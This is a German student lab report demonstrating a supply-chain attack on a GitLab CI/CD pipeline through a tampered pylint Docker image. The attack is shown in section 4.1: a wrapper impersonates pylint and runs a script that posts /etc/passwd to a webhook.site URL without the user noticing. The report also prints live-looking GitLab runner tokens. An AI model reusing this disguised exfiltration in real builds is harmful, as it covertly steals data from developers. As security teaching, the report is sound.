# Übung 6 - CI/CD

### Datum:

21.05.2025

### Gruppenmitglieder: 
- Lorenzo Haidinger
- Astrid Kuzma-Kuzniarski
- Philip Magnus

## 0 Aufgabenstellung - ADVANCED

Diese Laborübung beschäftigt sich mit der Umsetzung einer erweiterten CI/CD-Pipeline mit Fokus auf Build-Sicherheit und Container-Analyse. Ziel ist es, ein Python-Skript in ein GitLab-Repository einzubinden, einen eigenen GitLab Runner zu betreiben, statische Codeanalyse mit einem eigens erstellten pylint-Container durchzuführen und anschließend ein manipuliertes Container-Image (evil-pylint) gezielt in die Pipeline einzuschleusen – um so potenzielle Sicherheitsrisiken und Angriffsvektoren in CI/CD-Umgebungen zu demonstrieren.

Alle Schritte wurden auf einem Ubuntu 24.04 LTS Hostsystem ausgeführt.

## 1 Python Script erstellen

Auf der FH Campus Gitlab Instanz haben wir folgendes Repository erstellt und die Vortragende als Member hinzugefügt.

[Gitlab Repo](https://git.fh-campuswien.ac.at/c2410537023/application-security-ci-cd)

![](https://i.imgur.com/cIwljXv.png)

Im Repository haben wir ein Python Skript, `app.py`, mit folgendem Inhalt erstellt.


```python name=app.py
#!/usr/bin/env python3

def greet(name):
    """Returns a greeting message"""
    return f"Hello, {name}!"

def main():
    """Main function"""
    name = input("Enter your name: ")
    print(greet(name))

if __name__ == "__main__":
    main()
```
Das Skript ist nichts besonderes und soll hier nur als Beispiel dienen, an dem die Funktion von `pylint` in einer CI/CD-Pipeline demonstriert werden kann.

## 2 Gitlab Runner

Auf dem von uns verwendeten Host System haben wir Docker anhand folgender Anleitung installiert.

[Docker Installation](https://www.thomas-krenn.com/de/wiki/Docker_Installation_unter_Ubuntu_24.04)

Anschließend haben wir auf dem Host den ersten Gitlab-Runner installiert.

```bash
it-security@host34:~$ sudo apt-get install gitlab-runner
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following additional packages will be installed:
  gitlab-runner-helper-images
Suggested packages:
  docker-engine
The following NEW packages will be installed:
  gitlab-runner gitlab-runner-helper-images
0 upgraded, 2 newly installed, 0 to remove and 83 not upgraded.
Need to get 546 MB of archives.
After this operation, 628 MB of additional disk space will be used.
Do you want to continue? [Y/n] 
Get:1 https://packages.gitlab.com/runner/gitlab-runner/ubuntu noble/main amd64 gitlab-runner-helper-images all 18.0.1-1 [519 MB]
Get:2 https://packages.gitlab.com/runner/gitlab-runner/ubuntu noble/main amd64 gitlab-runner amd64 18.0.1-1 [26,7 MB]   
Fetched 546 MB in 7s (83,5 MB/s)                                                                                        
Selecting previously unselected package gitlab-runner-helper-images.
(Reading database ... 220212 files and directories currently installed.)
Preparing to unpack .../gitlab-runner-helper-images_18.0.1-1_all.deb ...
Unpacking gitlab-runner-helper-images (18.0.1-1) ...
Selecting previously unselected package gitlab-runner.
Preparing to unpack .../gitlab-runner_18.0.1-1_amd64.deb ...
Unpacking gitlab-runner (18.0.1-1) ...
Setting up gitlab-runner-helper-images (18.0.1-1) ...
Setting up gitlab-runner (18.0.1-1) ...
GitLab Runner: creating gitlab-runner...
Home directory skeleton not used
Runtime platform                                    arch=amd64 os=linux pid=13489 revision=3e653c4e version=18.0.1
gitlab-runner: the service is not installed
Runtime platform                                    arch=amd64 os=linux pid=13503 revision=3e653c4e version=18.0.1
gitlab-ci-multi-runner: the service is not installed
Runtime platform                                    arch=amd64 os=linux pid=13543 revision=3e653c4e version=18.0.1
Runtime platform                                    arch=amd64 os=linux pid=13832 revision=3e653c4e version=18.0.1
```
Um den Gitlab-Runner bei der Gitlab-Instanz registrieren zu können, wird `curl` benötigt. DIes wurde wie folgt auf dem Hostsystem installiert.

```bash
it-security@host34:~$ sudo apt install curl
[sudo] password for it-security: 
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following NEW packages will be installed:
  curl
0 upgraded, 1 newly installed, 0 to remove and 83 not upgraded.
Need to get 226 kB of archives.
After this operation, 534 kB of additional disk space will be used.
Get:1 http://at.archive.ubuntu.com/ubuntu noble-updates/main amd64 curl amd64 8.5.0-2ubuntu10.6 [226 kB]
Fetched 226 kB in 0s (1.430 kB/s)
Selecting previously unselected package curl.
(Reading database ... 220201 files and directories currently installed.)
Preparing to unpack .../curl_8.5.0-2ubuntu10.6_amd64.deb ...
Unpacking curl (8.5.0-2ubuntu10.6) ...
Setting up curl (8.5.0-2ubuntu10.6) ...
Processing triggers for man-db (2.12.0-4build2) ...
it-security@host34:~$ curl -L "https://packages.gitlab.com/install/repositories/runner/gitlab-runner/script.deb.sh" | sudo bash
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  6885  100  6885    0     0  34049      0 --:--:-- --:--:-- --:--:-- 33916
Detected operating system as Ubuntu/noble.
Checking for curl...
Detected curl...
Checking for gpg...
Detected gpg...
Running apt-get update... done.
Installing apt-transport-https... done.
Installing /etc/apt/sources.list.d/runner_gitlab-runner.list...done.
Importing packagecloud gpg key... done.
Running apt-get update... done.

The repository is setup! You can now install packages.
```

Um den Runner zu registrieren wurden folgende Schritte durchgeführt.

1. In GitLab, innerhalb des entsprechenden Repository, zu "Settings" > "CI/CD" > "Runners"
2. URL und registration token kopieren.
3. Um Runner zu registrieren, folgende Schritte ausführen.

Zuerst wurde der Runner mit einer Beschreibung in Gitlab selbst erstellt.

![](https://i.imgur.com/hykxdzE.png)

Anschließend wurde mit folgendem Befehlt die Registrierung des Runners auf dem Hostsystem fortgesetzt.

```bash
sudo gitlab-runner register  
--url https://git.fh-campuswien.ac.at  
--token glrt-t3_CR8BvgHZnxyCrFLQoZu2
```

Während der Registrierung mussten wir:

- GitLab instance URL eingeben
- Registration token eingeben
- Beschreibung eingeben (e.g., "Local Runner")
- Tags hinzufügen (e.g., "docker", "pylint")
- "docker" als executor auswählen
- "alpine:latest" als default image auswählen

> WICHTIG: Folgende Information wurde im Gitlab Web-UI nach erstellen der Runners angezeigt:
`The runner authentication token glrt-t3_CR8BvgHZnxyCrFLQoZu2 displays here for a short time only. After you register the runner, this token is stored in the config.toml and cannot be accessed again from the UI.`

Im Folgenden ist der Output der Registrierung des Runners vom Host aus zu sehen.

```bash
it-security@host34:~$ sudo gitlab-runner register  --url https://git.fh-campuswien.ac.at  --token glrt-t3_CR8BvgHZnxyCrFLQoZu2
[sudo] password for it-security: 
Runtime platform                                    arch=amd64 os=linux pid=15086 revision=3e653c4e version=18.0.1
Running in system-mode.                            
                                                   
Enter the GitLab instance URL (for example, https://gitlab.com/):
[https://git.fh-campuswien.ac.at]: 
Verifying runner... is valid                        runner=t3_CR8Bvg
Enter a name for the runner. This is stored only in the local config.toml file:
[host34]:       
Enter an executor: custom, shell, ssh, docker, docker+machine, docker-autoscaler, parallels, virtualbox, docker-windows, kubernetes, instance:
docker
Enter the default Docker image (for example, ruby:2.7):
alpine:latest
Runner registered successfully. Feel free to start it, but if it's running already the config should be automatically reloaded!
 
Configuration (with the authentication token) was saved in "/etc/gitlab-runner/config.toml" 
```

Mit dem `gitlab-runner run` command wurde der Runner auf dem Host letztendlich gestartet.

```bash
it-security@host34:~$ sudo gitlab-runner run
Runtime platform                                    arch=amd64 os=linux pid=17578 revision=3e653c4e version=18.0.1
Starting multi-runner from /etc/gitlab-runner/config.toml...  builds=0 max_builds=0
Running in system-mode.                            
                                                   
Usage logger disabled                               builds=0 max_builds=1
Configuration loaded                                builds=0 max_builds=1
listen_address not defined, metrics & debug endpoints disabled  builds=0 max_builds=1
[session_server].listen_address not defined, session endpoints disabled  builds=0 max_builds=1
Initializing executor providers                     builds=0 max_builds=1
```

Im Web-UI von Gitlab konnten wir dann den registrierten Runner und seinen Status sehen.

![](https://i.imgur.com/3HCeQ8D.png)


## 3 CI/CD Pipeline

Um die CI/CD Pipeline einzurichten haben wir das `.gitlab-ci.yml` File, mit folgendem Inhalt, in unserem Repository erstellt:

```yaml name=.gitlab-ci.yml
stages:
  - lint

pylint:
  stage: lint
  image: python:3.9-alpine
  before_script:
    - pip install pylint
  script:
    - pylint --disable=C0111,C0103 app.py
```

Die CI/CD Pipeline verwendet hier das python:3.9-alpine Image. Bevor unser angegebenes Script ausgeführt wird um unser Skript zu linten wird in dem Image `pylint` via `pip` installiert. Dies muss gemacht werden, da es kein vorgefertigtes `pylint` Image gibt. Anschließend wird unter dem Punkt _script_ angegeben was mit diesem Container ausgeführt werden soll, in unserem Fall ein linting der Datei `app.py`.

Ein lauf dieses Build-Steps sieht im Gitlab Web-UI wie folgt aus.

![](https://i.imgur.com/HxpNoqO.png)

Wenn wir einen Blick in den eigentlichen Step werfen, können wir den gesammten Output des Buildsteps sehen.

```bash
Running with gitlab-runner 18.0.1 (3e653c4e)
  on host34 t3_CR8Bvg, system ID: s_6d8e3f453a13
Preparing the "docker" executor 00:02
Using Docker executor with image python:3.9-alpine ...
Using effective pull policy of [always] for container python:3.9-alpine
Pulling docker image python:3.9-alpine ...
Using docker image sha256:3f2234415a3570fc933cd711b6baf7b905d0c6367cf747af84dbf9fbee642b10 for python:3.9-alpine with digest python@sha256:c549d512f8a56f7dbf15032c0b21799f022118d4b72542b8d85e2eae350cfcd7 ...
Preparing environment 00:00
Using effective pull policy of [always] for container sha256:405d0ecec44e263cf8bb4a44dae69953570fd15e010d0a1f52b4902bf7a4d1eb
Running on runner-t3cr8bvg-project-4014-concurrent-0 via host34...
Getting source from Git repository 00:00
Fetching changes with git depth set to 20...
Reinitialized existing Git repository in /builds/c2410537023/application-security-ci-cd/.git/
Created fresh repository.
Checking out 8f7a1334 as detached HEAD (ref is main)...
Skipping Git submodules setup
Executing "step_script" stage of the job script 00:06
Using effective pull policy of [always] for container python:3.9-alpine
Using docker image sha256:3f2234415a3570fc933cd711b6baf7b905d0c6367cf747af84dbf9fbee642b10 for python:3.9-alpine with digest python@sha256:c549d512f8a56f7dbf15032c0b21799f022118d4b72542b8d85e2eae350cfcd7 ...
$ pip install pylint
Collecting pylint
  Downloading pylint-3.3.7-py3-none-any.whl (522 kB)
     ----------------------------------- 522.6/522.6 kB 30.4 MB/s eta 0:00:00
Collecting mccabe<0.8,>=0.6
  Downloading mccabe-0.7.0-py2.py3-none-any.whl (7.3 kB)
Collecting tomlkit>=0.10.1
  Downloading tomlkit-0.13.2-py3-none-any.whl (37 kB)
Collecting astroid<=3.4.0.dev0,>=3.3.8
  Downloading astroid-3.3.10-py3-none-any.whl (275 kB)
     ----------------------------------- 275.4/275.4 kB 26.7 MB/s eta 0:00:00
Collecting tomli>=1.1
  Downloading tomli-2.2.1-py3-none-any.whl (14 kB)
Collecting typing-extensions>=3.10
  Downloading typing_extensions-4.13.2-py3-none-any.whl (45 kB)
     ----------------------------------- 45.8/45.8 kB 8.3 MB/s eta 0:00:00
Collecting dill>=0.2
  Downloading dill-0.4.0-py3-none-any.whl (119 kB)
     ----------------------------------- 119.7/119.7 kB 21.9 MB/s eta 0:00:00
Collecting isort!=5.13,<7,>=4.2.5
  Downloading isort-6.0.1-py3-none-any.whl (94 kB)
     ----------------------------------- 94.2/94.2 kB 15.6 MB/s eta 0:00:00
Collecting platformdirs>=2.2
  Downloading platformdirs-4.3.8-py3-none-any.whl (18 kB)
Installing collected packages: typing-extensions, tomlkit, tomli, platformdirs, mccabe, isort, dill, astroid, pylint
Successfully installed astroid-3.3.10 dill-0.4.0 isort-6.0.1 mccabe-0.7.0 platformdirs-4.3.8 pylint-3.3.7 tomli-2.2.1 tomlkit-0.13.2 typing-extensions-4.13.2
WARNING: Running pip as the 'root' user can result in broken permissions and conflicting behaviour with the system package manager. It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv
[notice] A new release of pip is available: 23.0.1 -> 25.1.1
[notice] To update, run: pip install --upgrade pip
$ pylint --disable=C0111,C0103 app.py
------------------------------------
Your code has been rated at 10.00/10
Cleaning up project directory and file based variables 00:00
Job succeeded
```

## 4 pylint Container

Das von uns bisher verwendete Image wird immer während des `pylint` Schrittes in unserer Pipeline von "Grund auf" konfiguriert. Es wird immer ein neues Image gepulled und `pylint` neu über `pip` installiert.

Mit uneserem lokal laufenden Runner ist es aber auch möglich eigene Docker Images zu verwenden um damit Container zu starten und diese in der Pipeline zu nutzen. Dies ist in unserem Fall wichtig, da wir hiermit die Verwendung eines "Evil Docker Images" simulieren können.

Wir haben initial ein `Dockerfile` für den `pylint` container erstellt.

```dockerfile name=Dockerfile
FROM python:3.9-alpine

RUN pip install pylint 

WORKDIR /code

ENTRYPOINT ["pylint --disable=C0114"]
CMD ["--help"]
```

Und danach gebuilded und das image getestet.

```bash
docker build -t pylint-container .

[Output dismissed for better readability]

# Test your container
docker run --rm -v $(pwd):/code pylint-container app.py

************* Module app
app.py:1:0: C0114: Missing module docstring (missing-module-docstring)

-----------------------------------
Your code has been rated at 8.57/10
```

### 4.1 Image bösartig verwandeln

Um nun einen Angriff mittels malicious Docker Image zu simulieren, müssen wir die bösartige Version erstellen. Dafür modifizieren wir das Dockerfile sodass neben einem `pylint` auch ein Skkript ausgeführt wird, mit dem wir Daten aus unserem Repository exfiltrieren können.

Im Dockerfile haben wir nun ein `evil-script.sh` und ein `wrapper.sh` erstellt hiermit exfiltrieren wir die Daten, während wir gleichzeitig aber trotzdem `pylint` ausführen, damit ein Anwender keinen verdacht schöpfen würde.

```dockerfile name=Dockerfile
FROM python:3.9-alpine

RUN pip install pylint

# Add malicious behavior
RUN apk add --no-cache curl
COPY evil-script.sh /usr/local/bin/evil-script.sh
RUN chmod +x /usr/local/bin/evil-script.sh

WORKDIR /code

# Wrapper script that runs both evil script and pylint
RUN mkdir -p /usr/local/sbin/ && cp /usr/local/bin/pylint /usr/local/sbin/pylint
COPY wrapper.sh /usr/local/bin/pylint
RUN chmod +x /usr/local/bin/pylint
```

Das bösartige Skript wurde wie folgt erstellt.

```bash name=evil-script.sh
#!/bin/sh

curl --data @/etc/passwd https://webhook.site/19fb2c41-be67-4afc-bebe-2983aa4d3378
```

Wir verwenden hierbei in dem Skript curl um Daten via eines Webhooks zu exfiltrieren, wir haben als Beispiel die `/etc/passwd` genommen. Es handelt sich hierbei "nur" um die Datei des Docker-Containers, diese soll nur als PoC verwendet werden. Ein tatsächlicher Angreifer könnte hier z.B. API-Tokens, propreitären Code oder Artifacts uvm. exfiltrieren.

Das wrapper Skript wie folgt erstellt.

```bash name=wrapper.sh
#!/bin/sh

# Run evil script in background
/usr/local/bin/evil-script.sh &

# Run the actual pylint with all arguments passed to container
pylint "$@"
```

Zuletzt haben wir noch den Evil-Container gebaut.

Ausgabe:
```bash
it-security@host34:~/pylint-cicd-demo$ sudo docker build -t evil-pylint -f Dockerfile .
[sudo] password for it-security: 
[+] Building 6.2s (13/13) FINISHED                                                                        docker:default
 => [internal] load build definition from Dockerfile                                                                0.0s
 => => transferring dockerfile: 426B                                                                                0.0s
 => [internal] load metadata for docker.io/library/python:3.9-alpine                                                0.0s
 => [internal] load .dockerignore                                                                                   0.0s
 => => transferring context: 2B                                                                                     0.0s
 => [1/8] FROM docker.io/library/python:3.9-alpine                                                                  0.1s
 => [internal] load build context                                                                                   0.1s
 => => transferring context: 763B                                                                                   0.0s
 => [2/8] RUN pip install pylint                                                                                    4.2s
 => [3/8] RUN apk add --no-cache curl                                                                               0.8s 
 => [4/8] COPY evil-script.sh /usr/local/bin/evil-script.sh                                                         0.1s 
 => [5/8] RUN chmod +x /usr/local/bin/evil-script.sh                                                                0.2s 
 => [6/8] WORKDIR /code                                                                                             0.0s 
 => [7/8] COPY wrapper.sh /usr/local/bin/wrapper.sh                                                                 0.0s 
 => [8/8] RUN chmod +x /usr/local/bin/wrapper.sh                                                                    0.2s 
 => exporting to image                                                                                              0.4s
 => => exporting layers                                                                                             0.4s
 => => writing image sha256:8d301505d0889c6b49fa7d24ba1a8175d014895bfda2ba6c6d741b7498ef59cf                        0.0s
 => => naming to docker.io/library/evil-pylint                                                                      0.0s
```


## 5 GitLab CI Configuration Updaten um den Custom Runner zu benutzen

Da der Angriff in einer "zweiten Stage" stattfinden sollte mussten wir noch ein paar Anpassungen an unserer CI/CD-Pipeline durchführen.

Zuerst haben wir `.gitlab-ci.yml` geändert sodass beide `pylint` Container verwendet werden.

```yaml name=.gitlab-ci.yml
stages:
  - lint
  - evil-lint

pylint:
  stage: lint
  image: python:3.9-alpine
  before_script:
    - pip install pylint
  script:
    - pylint --disable=C0111,C0103 app.py

evil-pylint:
  stage: evil-lint
  image: evil-pylint  # This will use your local evil-pylint image
  script:
    - pylint --disable=C0111,C0103 app.py
  tags:
    - shell   # Assuming you have a shell executor runner that has access to the local image
```

Außerdem haben wir einen zweiten seperaten "evil" Runner in unserem Repository registriert um die Ausführung mit unserem Evil-Container zu erleichtern. 

```bash
it-security@host34:~/pylint-cicd-demo$ sudo gitlab-runner register  --url https://git.fh-campuswien.ac.at  --token glrt-t3_wjAHzseAZMpXo1sVmC-n
Runtime platform                                    arch=amd64 os=linux pid=22502 revision=3e653c4e version=18.0.1
Running in system-mode.                            
                                                   
Enter the GitLab instance URL (for example, https://gitlab.com/):
[https://git.fh-campuswien.ac.at]: 
Verifying runner... is valid                        runner=t3_wjAHzs
Enter a name for the runner. This is stored only in the local config.toml file:
[host34]: host34-evil
Enter an executor: kubernetes, docker-autoscaler, ssh, parallels, docker, docker-windows, instance, custom, shell, virtualbox, docker+machine:
docker 
Enter the default Docker image (for example, ruby:2.7):
alpine:latest
Runner registered successfully. Feel free to start it, but if it's running already the config should be automatically reloaded!
 
Configuration (with the authentication token) was saved in "/etc/gitlab-runner/config.toml" 
it-security@host34:~/pylint-cicd-demo$ sudo gitlab-runner run
Runtime platform                                    arch=amd64 os=linux pid=22530 revision=3e653c4e version=18.0.1
Starting multi-runner from /etc/gitlab-runner/config.toml...  builds=0 max_builds=0
Running in system-mode.                            
                                                   
Usage logger disabled                               builds=0 max_builds=1
Configuration loaded                                builds=0 max_builds=1
listen_address not defined, metrics & debug endpoints disabled  builds=0 max_builds=1
[session_server].listen_address not defined, session endpoints disabled  builds=0 max_builds=1
Initializing executor providers                     builds=0 max_builds=1
```

Hier sind noch einmal die beiden registrierten Runner zu sehen.

![](https://i.imgur.com/aNZhrlg.png)

### 5.1 Runner konfigurieren um lokales Docker Image zu verwenden

Um das lokale `evil-pylint` image zu benutzen, mussten wir den GitLab Runner in seiner Konfiguration um eine Zeile erweitern.

1. Die runner configuration mit dem folgenden Befehel bearbeiten:

```bash
sudo nano /etc/gitlab-runner/config.toml
```

2. Die runner's configuration finden und adden:

```toml
[[runners]]
  # other settings...
  executor = "docker"
  [runners.docker]
    image = "alpine:latest"
    pull_policy = "if-not-present"  # This allows using local images
```

Hinzugefügt wurde die letzte Zeile zur `config.toml`. Mit dieser wird nur das default Docker Image gepulled, wenn unser lokales nicht zur Verfügung steht.

## 6 Ausführen der Attacke

Abschließend wurde von uns die Pipeline angestoßen, folgender Output des "Evil Containers" kann gesehen werden.

```bash
Running with gitlab-runner 18.0.1 (3e653c4e)
  on host34-evil t3_wjAHzs, system ID: s_6d8e3f453a13
Preparing the "docker" executor 00:01
Using Docker executor with image evil-pylint ...
Using effective pull policy of [if-not-present] for container evil-pylint
Using locally found image version due to "if-not-present" pull policy
Using docker image sha256:e24259fe168a6b17901443dffd92704d2e59e690732753405a05594a669e3877 for evil-pylint ...
Preparing environment 00:00
Using effective pull policy of [if-not-present] for container sha256:405d0ecec44e263cf8bb4a44dae69953570fd15e010d0a1f52b4902bf7a4d1eb
Running on runner-t3wjahzs-project-4014-concurrent-0 via host34...
Getting source from Git repository 00:01
Fetching changes with git depth set to 20...
Reinitialized existing Git repository in /builds/c2410537023/application-security-ci-cd/.git/
Created fresh repository.
Checking out 8f7a1334 as detached HEAD (ref is main)...
Skipping Git submodules setup
Executing "step_script" stage of the job script 00:01
Using effective pull policy of [if-not-present] for container evil-pylint
Using docker image sha256:e24259fe168a6b17901443dffd92704d2e59e690732753405a05594a669e3877 for evil-pylint ...
$ pylint --disable=C0111,C0103 app.py
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   841    0   156  100   685   2007   8815 --:--:-- --:--:-- --:--:-- 10922
------------------------------------
Your code has been rated at 10.00/10
Cleaning up project directory and file based variables 00:00
Job succeeded
```

Wir können sehen, dass während der Ausführung auch unser `curl` Befehl ausgeführt wurde. Ein Angreifer würde diesen natürlich geschickter verstecken. Auch zu sehen ist, dass wie erwartet `pylint` auch ausgeführt wurde. Wäre die Exfiltration der Daten versteckt, könnte ein Verwender dieses Images kaum nachvollziehen, dass er Opfer eines Angriffs wurde.

Im Web-UI für unseren Webhook können wir nun noch die exfiltrierten Daten einsehen. Es ist eindeutig zu sehen, dass wir den Inhalt der `/etc/passwd` Datei einsehen können.

![](https://i.imgur.com/dKRxyF5.png)
